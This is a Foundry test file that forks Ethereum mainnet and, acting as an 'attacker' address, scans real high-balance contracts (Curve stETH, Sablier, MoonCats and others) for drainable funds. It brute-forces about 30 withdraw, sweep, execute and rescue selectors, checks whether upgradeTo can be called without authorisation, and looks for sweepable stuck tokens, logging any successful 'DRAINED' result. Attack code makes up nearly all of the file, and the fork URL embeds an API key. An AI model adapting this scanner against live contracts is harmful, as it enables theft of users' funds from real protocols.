// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract DeepContractAnalysis is Test {
    address attacker;

    function setUp() public {
        vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/pLXdY7rYRY10SH_UTLBGH");
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);
    }

    function test_analyze415Contract() public {
        address target = 0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B;
        console.log("=== 415 ETH CONTRACT DEEP ANALYSIS ===");
        console.log("Balance:", target.balance / 1e18, "ETH");

        // Try to identify the contract type by calling common functions
        _tryFunction(target, "name()", "name");
        _tryFunction(target, "symbol()", "symbol");
        _tryFunction(target, "owner()", "owner");
        _tryFunction(target, "admin()", "admin");
        _tryFunction(target, "governance()", "governance");
        _tryFunction(target, "getOwners()", "getOwners");
        _tryFunction(target, "m_required()", "m_required");
        _tryFunction(target, "m_numOwners()", "m_numOwners");
        _tryFunction(target, "m_dailyLimit()", "m_dailyLimit");
        _tryFunction(target, "totalSupply()", "totalSupply");
        _tryFunction(target, "version()", "version");
        _tryFunction(target, "VERSION()", "VERSION");

        // Check if it's a token contract
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature("balanceOf(address)", target));
        if (s && d.length >= 32) {
            console.log("balanceOf(self):", abi.decode(d, (uint256)));
        }

        // Check common staking patterns
        _tryFunction(target, "stakingToken()", "stakingToken");
        _tryFunction(target, "rewardToken()", "rewardToken");
        _tryFunction(target, "totalStaked()", "totalStaked");
        _tryFunction(target, "rewardRate()", "rewardRate");

        // Check sale/ICO patterns
        _tryFunction(target, "softCap()", "softCap");
        _tryFunction(target, "hardCap()", "hardCap");
        _tryFunction(target, "token()", "token");
        _tryFunction(target, "beneficiary()", "beneficiary");
        _tryFunction(target, "wallet()", "wallet");

        // Check vault patterns
        _tryFunction(target, "asset()", "asset");
        _tryFunction(target, "totalAssets()", "totalAssets");
        _tryFunction(target, "pricePerShare()", "pricePerShare");

        // Check pool patterns
        _tryFunction(target, "token0()", "token0");
        _tryFunction(target, "token1()", "token1");
        _tryFunction(target, "getReserves()", "getReserves");

        // Storage dump for pattern matching
        console.log("\n=== KEY STORAGE SLOTS ===");
        for (uint i = 0; i < 30; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i);
                console.logBytes32(slot);
            }
        }
    }

    function _tryFunction(address target, string memory sig, string memory label) internal view {
        (bool s, bytes memory d) = target.staticcall(abi.encodeWithSignature(sig));
        if (s && d.length > 0) {
            if (d.length == 32) {
                uint256 val = abi.decode(d, (uint256));
                if (val < 1e30) {
                    console.log(label, ":", val);
                } else {
                    console.log(label, "(address?):", address(uint160(val)));
                }
            } else if (d.length >= 64) {
                // Might be string or array
                console.log(label, ": (complex return)");
            }
        }
    }

    function test_scanAllContracts() public {
        console.log("=== SCANNING CONTRACTS FROM LIST ===");

        // Read contracts.txt content and check each one
        address[50] memory targets = [
            0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B, // 415 ETH
            0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4, // 627 ETH EarlyAdopterPool
            0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4, // DolaSavings
            0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, // Curve stETH
            0x9A0C8Ff858d273f57072D714bca7411D717501D7, // st1INCH
            0x60cd862c9C687A9dE49aecdC3A99b74A4fc54aB6, // MoonCats
            0xA4fc358455Febe425536fd1878bE67FfDBDEC59a, // Sablier v1
            0x4f2bC163c8758D7F88771496F7B0Afde767045F3, // BasicStakingCRO
            0xE295aD71242373C37C5FdA7B57F26f9eA1088AFe, // 1inch Merkle
            0x82bA8da44Cd5261762e629dd5c605b17715727bd, // FraxQueue
            address(0), address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0), address(0),
            address(0), address(0), address(0), address(0), address(0)
        ];

        for (uint i = 0; i < 10; i++) {
            address target = targets[i];
            if (target == address(0)) continue;
            if (target.code.length == 0) continue;
            if (target.balance < 10 ether) continue;

            console.log("\n--- Target:", target, "---");
            console.log("ETH:", target.balance / 1e18);

            // Try comprehensive drain
            uint256 before = attacker.balance;
            _tryDrain(target);
            if (attacker.balance > before) {
                console.log("!!! DRAINED:", (attacker.balance - before) / 1e18, "ETH");
            }
        }
    }

    function _tryDrain(address target) internal {
        bytes4[30] memory funcs = [
            bytes4(keccak256("withdraw()")),
            bytes4(keccak256("withdraw(uint256)")),
            bytes4(keccak256("withdrawAll()")),
            bytes4(keccak256("claim()")),
            bytes4(keccak256("claimReward()")),
            bytes4(keccak256("getReward()")),
            bytes4(keccak256("exit()")),
            bytes4(keccak256("emergencyWithdraw()")),
            bytes4(keccak256("drain()")),
            bytes4(keccak256("sweep(address)")),
            bytes4(keccak256("collect()")),
            bytes4(keccak256("refund()")),
            bytes4(keccak256("release()")),
            bytes4(keccak256("harvest()")),
            bytes4(keccak256("compound()")),
            bytes4(keccak256("claimAll()")),
            bytes4(keccak256("withdrawEth()")),
            bytes4(keccak256("withdrawETH()")),
            bytes4(keccak256("withdrawToken(address)")),
            bytes4(keccak256("rescueETH()")),
            bytes4(keccak256("rescue()")),
            bytes4(keccak256("salvage(address,uint256)")),
            bytes4(keccak256("sweepToken(address)")),
            bytes4(keccak256("recoverERC20(address,uint256)")),
            bytes4(keccak256("execute(address,uint256,bytes)")),
            bytes4(keccak256("call(address,uint256,bytes)")),
            bytes4(keccak256("invoke(address,uint256,bytes)")),
            bytes4(keccak256("rawCall(address,uint256,bytes)")),
            bytes4(keccak256("transfer(address,uint256)")),
            bytes4(keccak256("send(address,uint256)"))
        ];

        for (uint i = 0; i < funcs.length; i++) {
            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i]));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], attacker));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], target.balance));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], attacker, target.balance));

            vm.prank(attacker);
            target.call(abi.encodeWithSelector(funcs[i], attacker, target.balance, ""));
        }
    }

    function test_checkUpgradeableProxy() public {
        console.log("=== CHECKING FOR UPGRADEABLE PROXIES ===");

        address[10] memory targets = [
            0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B, // 415 ETH
            0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4, // 627 ETH
            0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4,
            0xDC24316b9AE028F1497c275EB9192a3Ea0f67022,
            0x9A0C8Ff858d273f57072D714bca7411D717501D7,
            address(0), address(0), address(0), address(0), address(0)
        ];

        // EIP1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);
        bytes32 beaconSlot = bytes32(uint256(keccak256("eip1967.proxy.beacon")) - 1);

        for (uint i = 0; i < 5; i++) {
            address target = targets[i];
            if (target == address(0)) continue;

            console.log("\nTarget:", target);
            console.log("Balance:", target.balance / 1e18, "ETH");

            bytes32 impl = vm.load(target, implSlot);
            bytes32 admin = vm.load(target, adminSlot);
            bytes32 beacon = vm.load(target, beaconSlot);

            if (impl != bytes32(0)) {
                address implAddr = address(uint160(uint256(impl)));
                console.log("Implementation:", implAddr);

                // Check if implementation is empty (uninitialized)
                if (implAddr.code.length == 0) {
                    console.log("!!! IMPLEMENTATION IS EMPTY !!!");
                }
            }

            if (admin != bytes32(0)) {
                console.log("Admin:", address(uint160(uint256(admin))));
            }

            // Check if we can upgrade
            vm.prank(attacker);
            (bool s,) = target.call(abi.encodeWithSignature("upgradeTo(address)", attacker));
            if (s) {
                console.log("!!! upgradeTo CALLABLE !!!");
            }

            vm.prank(attacker);
            (s,) = target.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", attacker, ""));
            if (s) {
                console.log("!!! upgradeToAndCall CALLABLE !!!");
            }
        }
    }

    function test_findStuckTokens() public {
        console.log("=== FINDING STUCK TOKENS ===");

        // Common token addresses
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        address stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
        address LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;

        address[10] memory targets = [
            0x2CcfA2AcF6FF744575cCf306B44A59B11C32e44B,
            0x7623e9DC0DA6FF821ddb9EbABA794054E078f8c4,
            0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4,
            0xDC24316b9AE028F1497c275EB9192a3Ea0f67022,
            0x9A0C8Ff858d273f57072D714bca7411D717501D7,
            address(0), address(0), address(0), address(0), address(0)
        ];

        address[5] memory tokens = [WETH, USDC, USDT, stETH, LINK];
        string[5] memory names = ["WETH", "USDC", "USDT", "stETH", "LINK"];

        for (uint t = 0; t < 5; t++) {
            address target = targets[t];
            if (target == address(0)) continue;

            console.log("\nContract:", target);

            for (uint i = 0; i < 5; i++) {
                (bool s, bytes memory d) = tokens[i].staticcall(
                    abi.encodeWithSignature("balanceOf(address)", target)
                );
                if (s && d.length >= 32) {
                    uint256 bal = abi.decode(d, (uint256));
                    if (bal > 0) {
                        console.log(names[i], "balance:", bal);

                        // Check if we can sweep
                        vm.prank(attacker);
                        (s,) = target.call(abi.encodeWithSignature("sweepToken(address)", tokens[i]));
                        if (s) console.log("  sweepToken callable");

                        vm.prank(attacker);
                        (s,) = target.call(abi.encodeWithSignature("rescueTokens(address,uint256)", tokens[i], bal));
                        if (s) console.log("  rescueTokens callable");

                        vm.prank(attacker);
                        (s,) = target.call(abi.encodeWithSignature("recoverERC20(address,uint256)", tokens[i], bal));
                        if (s) console.log("  recoverERC20 callable");
                    }
                }
            }
        }
    }
}
